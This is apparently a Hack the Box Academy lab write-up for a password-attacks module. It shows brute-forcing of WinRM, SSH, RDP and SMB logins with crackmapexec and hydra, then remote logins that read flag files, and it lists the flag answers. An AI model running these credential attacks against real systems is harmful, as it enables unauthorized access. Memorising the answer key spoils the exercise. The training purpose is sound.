# Password Attacks
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Password Attacks
* Tier: I
* Difficulty: Medium
* Category: Offensive
* Time estimate: 8 hours
* Date: DD-MM-YYYY
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Network Services
### Question 1:
![](./attachments/Pasted%20image%2020230202203530.png)

```
┌──(kali㉿kali)-[~/HTB]
└─$ crackmapexec winrm 10.129.202.136 -u /home/kali/Downloads/Password-Attacks/Password-Attacks/username.list -p /home/kali/Downloads/Password-Attacks/Password-Attacks/password.list 
SMB         10.129.202.136  5985   WINSRV           [*] Windows 10.0 Build 17763 (name:WINSRV) (domain:WINSRV)
HTTP        10.129.202.136  5985   WINSRV           [*] http://10.129.202.136:5985/wsman
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\admin:123456
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\admin:12345

(...)

WINSRV\john:123456
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\john:12345
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\john:123456789
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\john:batman
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\john:password
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\john:iloveyou
WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\john:princess
WINRM       10.129.202.136  5985   WINSRV           [+] WINSRV\john:november (Pwn3d!)
```

```
┌──(kali㉿kali)-[~/HTB/ShellsAndPayloads]
└─$ evil-winrm -i 10.129.231.100 -u john -p november

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                             

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                               

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\john> cd Desktop
*Evil-WinRM* PS C:\Users\john\Desktop> ls


    Directory: C:\Users\john\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         1/5/2022   8:13 AM             18 flag.txt


*Evil-WinRM* PS C:\Users\john\Desktop> type flag.txt
HTB{That5Novemb3r}
```

**Answer:** `HTB{That5Novemb3r}`

### Question 2:
![](./attachments/Pasted%20image%2020230202203536.png)

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/NetworkServices/Password-Attacks]
└─$ crackmapexec ssh 10.129.231.100 -u dennis -p password.list 
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing WINRM protocol database
[*] Initializing SSH protocol database
[*] Initializing SMB protocol database
[*] Initializing MSSQL protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SSH         10.129.231.100  22     10.129.231.100   [*] SSH-2.0-OpenSSH_for_Windows_7.7
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:123456 Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:12345 Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:123456789 Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:batman Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:password Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:iloveyou Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:princess Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:november Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:1234567 Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [-] dennis:12345678 Authentication failed.
SSH         10.129.231.100  22     10.129.231.100   [+] dennis:rockstar
```

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/NetworkServices/Password-Attacks]
└─$ ssh dennis@10.129.231.100
The authenticity of host '10.129.231.100 (10.129.231.100)' can't be established.
ED25519 key fingerprint is SHA256:dRz9BL6NhfzNWUhWdhoTCZB0pFXi+moLOqEj4XlPHOY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.231.100' (ED25519) to the list of known hosts.
dennis@10.129.231.100's password: 
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.
 
dennis@WINSRV C:\Users\dennis>cd Desktop           

dennis@WINSRV C:\Users\dennis\Desktop>dir 
 Volume in drive C has no label.      
 Volume Serial Number is 2683-3D37    
  
 Directory of C:\Users\dennis\Desktop 

01/05/2022  08:16 AM    <DIR>          .
01/05/2022  08:16 AM    <DIR>          ..
01/05/2022  08:39 AM                15 flag.txt
               1 File(s)             15 bytes
               2 Dir(s)  26,289,946,624 bytes free

dennis@WINSRV C:\Users\dennis\Desktop>type flag.txt 
HTB{Let5R0ck1t}
```

**Answer:** `HTB{Let5R0ck1t}`

### Question 3:
![](./attachments/Pasted%20image%2020230202203546.png)

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/NetworkServices/Password-Attacks]
└─$ hydra -L mini_usernames.list -P password.list rdp://10.129.231.100
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-02 15:11:57
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 812 login tries (l:4/p:203), ~203 tries per task
[DATA] attacking rdp://10.129.231.100:3389/
[3389][rdp] account on 10.129.231.100 might be valid but account not active for remote desktop: login: cassie password: 12345678910, continuing attacking the account.
[3389][rdp] host: 10.129.231.100   login: chris   password: 789456123
[ERROR] freerdp: The connection failed to establish.
[STATUS] 694.00 tries/min, 694 tries in 00:01h, 118 to do in 00:01h, 4 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-02 15:13:27
```

```
┌──(kali㉿kali)-[~/HTB/ShellsAndPayloads/TheLiveEngagement]
└─$ xfreerdp /u:chris /p:'789456123' /v:10.129.231.100
(...)
```

![](./attachments/Pasted%20image%2020230202211513.png)

**Answer:** `HTB{R3m0t3DeskIsw4yT00easy}`

### Question 4:
![](./attachments/Pasted%20image%2020230202203557.png)

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/NetworkServices/Password-Attacks]
└─$ crackmapexec smb 10.129.231.100 -u cassie -p password.list
SMB         10.129.231.100  445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:123456 STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:12345 STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:123456789 STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:batman STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:password STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:iloveyou STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:princess STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:november STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:1234567 STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:12345678 STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:rockstar STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:abc123 STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:nicole STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [-] WINSRV\cassie:daniel STATUS_LOGON_FAILURE 
SMB         10.129.231.100  445    WINSRV           [+] WINSRV\cassie:12345678910
```

```
┌──(kali㉿kali)-[~/HTB/PasswordAttacks/NetworkServices/Password-Attacks]
└─$ smbclient \\\\10.129.231.100\\CASSIE -U cassie 
Password for [WORKGROUP\cassie]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu Jan  6 12:48:47 2022
  ..                                 DR        0  Thu Jan  6 12:48:47 2022
  desktop.ini                       AHS      282  Thu Jan  6 09:44:52 2022
  flag.txt                            A       16  Thu Jan  6 09:46:14 2022

                10328063 blocks of size 4096. 6415514 blocks available
smb: \> get flag.txt
smb: \> !cat flag.txt
HTB{S4ndM4ndB33}
```

**Answer:** `HTB{S4ndM4ndB33}`

---
## 
### Question:


**Answer:** ``

---
## 
### Question:


**Answer:** ``

---
**Tags:** [[Hack The Box Academy]]